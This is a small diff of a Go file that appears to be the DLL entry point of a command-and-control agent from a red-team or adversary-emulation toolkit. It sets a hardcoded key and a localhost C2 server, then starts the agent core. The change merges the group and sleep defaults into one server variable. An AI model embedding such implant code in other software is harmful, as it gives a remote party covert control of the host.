@@ -9,9 +9,7 @@ import (
 
 var (
 	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
-	defaultServer = "http://localhost:8888"
-	defaultGroup = "my_group"
-	defaultSleep = "60"
+	server = "http://localhost:8888"
 	c2Name = "HTTP"
 	c2Key = ""
 )
@@ -19,7 +17,7 @@ var (
 //export VoidFunc
 func VoidFunc() {
 	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
-	core.Core(defaultServer, defaultGroup, defaultSleep, 0, nil, c2Config, false, 0)
+	core.Core(server, 0, nil, c2Config, false, 0)
 }
 
 func main() {}
